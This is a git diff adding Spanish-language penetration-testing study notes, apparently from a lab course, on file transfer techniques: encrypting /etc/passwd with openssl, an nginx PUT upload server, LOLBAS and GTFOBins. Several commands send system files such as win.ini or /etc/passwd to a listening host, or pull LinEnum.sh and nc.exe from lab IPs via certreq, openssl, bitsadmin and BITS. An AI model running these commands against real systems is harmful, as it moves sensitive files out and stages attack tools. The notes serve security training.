@@ -636,5 +636,119 @@ Para encriptar un fichero usando "openssl" selecionaremos el tipo de ciprado por
 openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 ```
 
+Recuerda que contra mas dificil sea la contraseña menos posibilidades para ataques de fuerza bruta.
+
+### DESENCRIPTAR PASSWD.enc CON OPENSSL
+
+```
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+
+Nosotros podemos usar otros metodos de transferencia de archivos, pero es recomendable utilizar metodos HTTPS, SFTP o SSH siempre.
+
+## COGER ARCHIVOS DE HTTP/S
+
+La transferencia web es muy comun entre archivos porque HTTP/HTTPS es el protocolo más comun que pasa por los firewalls. Otro beneficio inmenso, en muchos casos, que los archivos van encriptados en transito. Esto es malo para los penetration tester, y clientes de red IDS que mandan o transfieren archivos sensibles o en texto plano como contraseñas sin encriptar.
+
+Nosotros discutimos usando Pyhon3 "upload modulo" para hacer un servidor con sus capacidades, podemos usar Apache o Nginx
+
+## NGINX - ENABLING PUT
+
+Una buena alternativa para transferir archivos de apache es Nginx porque la configuracion es menos complicada, y el modulo no genera problemas de seguridad como Apache.
+
+Cuando subimos HTPP, es 100 critico y para hacer codigos de ejecución. Apache hace que esto sea mas facil, y el modulo de php se puede configurar. Con Nginx podemos hacer que no sea tan simple
+
+### CREAR UN DIRECTORIO SUBIENDO ARCHIVOS
+
+```
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+### CREAR UN ARCHIVO DE CONFIGURACION DE NGINX
+
+Se crea en /etc/nginx/sites-avaliable/upload.conf
+
+```
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+```
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo systemctl restart nginx.service
+```
+
+En caso de tener mensajes de error, chekear /var/log/nginx/error.log
+
+```
+tail -2 /var/log/nginx/error.log
+ss -lnpt | grep 80
+ps -ef | grep 2811
+```
+
+### REMOVER CONFIGURACION POR DEFECTO
+
+```
+sudo rm /etc/nginx/sites-enabled/default
+```
+Ahora nosotros podemos subir usando cURL mandando respuestas "PUT". En el ejemplo de abajo, podemos subir el /etc/passwd llamado "user.txt"
+
+```
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+```
+
+Una vez podemos probar a ir a la ruta por el navegador.
+
+## VIVIR DE LA TIERRA
+
+La frase "vivir en la tierra" es un termino de una discussion de twiter y es la información que tienen las páginas web
+
+- Descarga
+- Subida
+- Ejecutar comandos
+- Leer archivos
+- Escribir archivo
+- Bypass
+
+### USAR LOLBAS Y GTFOBINS PROJECT
+
+[LOLBAS para windows](https://lolbas-project.github.io/#) y [GTFOBins para Linux](https://gtfobins.github.io/) son wesites que buscan archivos binarios utilizando diferentes funciones.
+
+### LOLBAS
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/7b3c8f7c-51d2-4367-b6b9-0b75f82157ff)
+
+Vamos a usar [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) Necesitaremos tener un puerto escuchando para saber el trafico que pasa
+
+```
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+sudo nc -lvnp 8000
+```
+### GTFOBins
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/24131aae-e4e9-4076-b4e4-f1b891c4a013)
+
+### CREAR UN CERTIFICADO
+
+```
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+### OTROS COMANDOS
+
+```
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
 
 
